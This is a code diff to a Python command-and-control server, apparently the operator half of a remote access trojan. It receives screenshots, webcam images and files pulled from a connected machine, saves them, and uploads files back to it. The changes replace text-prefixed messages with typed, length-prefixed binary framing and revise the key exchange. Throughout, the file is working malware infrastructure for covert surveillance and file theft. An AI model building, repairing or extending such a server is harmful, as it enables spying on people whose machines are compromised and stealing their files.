@@ -1,10 +1,11 @@
+
 import socket
 import sys
 import threading
 import os
 import json
 import datetime
-from io import BytesIO
+import struct
 
 try:
     from PIL import Image
@@ -12,8 +13,8 @@ try:
 except:
     PIL_AVAILABLE = False
 
-import protocol
 import crypto
+import protocol
 
 LANGUAGES = {
     'en': {
@@ -125,7 +126,6 @@ class C2Server:
         self.lang = 'en'
         self.crypto = crypto.SecureChannel()
         self.protocol = protocol.ProtocolHandler(self.crypto)
-        self.session_log = []
         
     def t(self, key):
         return LANGUAGES.get(self.lang, LANGUAGES['en']).get(key, key)
@@ -168,22 +168,21 @@ class C2Server:
     def receive_handler(self):
         while self.running:
             try:
-                payload = self.protocol.receive(self.client_socket)
+                msg_type, payload = self.protocol.receive(self.client_socket)
                 if payload is None:
                     print(f"\n[!] {self.t('disconnected')}")
                     self.running = False
                     break
                 
-                data = payload.decode('utf-8', errors='replace')
-                
-                if data.startswith('[SCREENSHOT]'):
-                    self.save_screenshot(data[12:])
-                elif data.startswith('[WEBCAM]'):
-                    self.save_webcam(data[8:])
-                elif data.startswith('[FILE]'):
-                    self.save_file(data[6:])
+                if msg_type == 'screenshot':
+                    self.save_screenshot(payload)
+                elif msg_type == 'webcam':
+                    self.save_webcam(payload)
+                elif msg_type == 'file':
+                    self.save_file(payload)
                 else:
-                    print(f"\n[+] {data}\n{self.t('prompt')}", end='', flush=True)
+                    text = payload.decode('utf-8', errors='replace')
+                    print(f"\n[+] {text}\n{self.t('prompt')}", end='', flush=True)
                     
             except Exception as e:
                 print(f"\n[-] Error: {e}")
@@ -192,35 +191,32 @@ class C2Server:
     
     def save_screenshot(self, data):
         try:
-            img_data = data.encode('latin-1')
             timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
             filename = f'screenshot_{timestamp}.png'
             with open(filename, 'wb') as f:
-                f.write(img_data)
+                f.write(data)
             print(f"\n[+] Screenshot saved: {filename}\n{self.t('prompt')}", end='', flush=True)
         except Exception as e:
             print(f"\n[-] Screenshot error: {e}\n{self.t('prompt')}", end='', flush=True)
     
     def save_webcam(self, data):
         try:
-            img_data = data.encode('latin-1')
             timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
             filename = f'webcam_{timestamp}.png'
             with open(filename, 'wb') as f:
-                f.write(img_data)
+                f.write(data)
             print(f"\n[+] Webcam saved: {filename}\n{self.t('prompt')}", end='', flush=True)
         except Exception as e:
             print(f"\n[-] Webcam error: {e}\n{self.t('prompt')}", end='', flush=True)
     
     def save_file(self, data):
         try:
-            parts = data.split('|', 1)
-            if len(parts) == 2:
-                filename, content = parts
-                content = content.encode('latin-1')
-                with open(filename, 'wb') as f:
-                    f.write(content)
-                print(f"\n[+] File saved: {filename} ({len(content)} bytes)\n{self.t('prompt')}", end='', flush=True)
+            filepath_len = struct.unpack(">I", data[:4])[0]
+            filepath = data[4:4+filepath_len].decode('utf-8')
+            content = data[4+filepath_len:]
+            with open(filepath, 'wb') as f:
+                f.write(content)
+            print(f"\n[+] File saved: {filepath} ({len(content)} bytes)\n{self.t('prompt')}", end='', flush=True)
         except Exception as e:
             print(f"\n[-] File error: {e}\n{self.t('prompt')}", end='', flush=True)
     
@@ -229,7 +225,9 @@ class C2Server:
             with open(filepath, 'rb') as f:
                 content = f.read()
             filename = os.path.basename(filepath)
-            data = f"[UPLOAD]{filename}|".encode('latin-1') + content
+            filepath_bytes = filename.encode('utf-8')
+            header = struct.pack(">I", len(filepath_bytes))
+            data = b'[FILE]' + header + filepath_bytes + content
             self.protocol.send(self.client_socket, data)
             print(f"[+] Sent: {filename}")
         except Exception as e:
@@ -290,8 +288,8 @@ class C2Server:
             self.client_socket, self.client_address = server.accept()
             print(self.t('connected').format(self.client_address[0], self.client_address[1]))
             
-            key_exchange = self.client_socket.recv(64).decode('utf-8')
-            self.crypto.set_key(key_exchange)
+            key = crypto.SecureChannel.recv_key(self.client_socket)
+            self.crypto.set_key(key)
             
             self.client_socket.settimeout(None)
             
